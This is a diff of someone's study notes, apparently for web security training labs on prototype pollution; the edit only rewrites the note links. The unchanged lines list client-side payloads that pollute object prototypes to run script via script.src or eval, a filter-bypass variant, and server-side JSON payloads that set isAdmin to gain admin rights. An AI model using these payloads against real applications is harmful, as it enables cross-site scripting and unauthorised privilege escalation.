@@ -39,19 +39,19 @@ Search feature
 - `searchLoggerConfigurable.js`
 	- `config.transport_url` 
 		- **Payload: `?__proto__[value]=data:,alert(1);`**
-		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.1.%20Lab%20Client-side%20prototype%20pollution%20via%20browser%20APIs%20%E2%AD%95%EF%B8%8F)
+		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.1. Lab Client-side prototype pollution via browser APIs ⭕️]]
 - `searchLogger.js`
 	- **Payload: `?__proto__[transport_url]=data:,alert(1)`**
-	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
 - `searchLoggerFiltered.js`
 	- **Payload: `?__pro__proto__to__[transport_url]=data:,alert(1)`**
-	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.4.%20Lab%20Client-side%20prototype%20pollution%20via%20flawed%20sanitization%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.4. Lab Client-side prototype pollution via flawed sanitization ⭕️]]
 - `jquery_3-0-0.js`
 	- **Payload: `?__proto__.sequence=alert(1)-`**
-	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]
 - `jquery_1-7-1.js`
 	- **Payload: `#__proto__[hitCallback]=alert(1)`**
-	- [Client side](Client%20side.md#2.5.%20Lab%20Client-side%20prototype%20pollution%20in%20third-party%20libraries%20%E2%AD%95%EF%B8%8F)
+	- [[Client side#2.5. Lab Client-side prototype pollution in third-party libraries ⭕️]]
 
 #### Server side
 Update Address feature
@@ -67,17 +67,17 @@ Use this to escalate your account's privilege to admin
     "isAdmin":true
 }
 ```
-- [Server side](Server%20side.md#2.6.%20Lab%20Privilege%20escalation%20via%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
+- [[Server side#2.6. Lab Privilege escalation via server-side prototype pollution ⭕️]]
 
 Stage 3 - extract contents of carlos secret
-- [SSPP](SSPP.md#Lab%20Exfiltrating%20sensitive%20data%20via%20server-side%20prototype%20pollution)
+- [[SSPP#Lab Exfiltrating sensitive data via server-side prototype pollution]]
 
 ##### `"foo":"bar"` *doesn't* reflect in response
-- [Server side](Server%20side.md#2.7.%20Lab%20Detecting%20server-side%20prototype%20pollution%20without%20polluted%20property%20reflection%20%E2%AD%95%EF%B8%8F)
+- [[Server side#2.7. Lab Detecting server-side prototype pollution without polluted property reflection ⭕️]]
 Enter this payload and notice the response indented then use the second one to escalate privileges to admin
 ```
 "constructor": { "prototype": { "json spaces":10 } }
 
 "constructor": { "prototype": { "isAdmin":true } }
 ```
-- [Server side](Server%20side.md#2.8.%20Lab%20Bypassing%20flawed%20input%20filters%20for%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
+- [[Server side#2.8. Lab Bypassing flawed input filters for server-side prototype pollution ⭕️]]
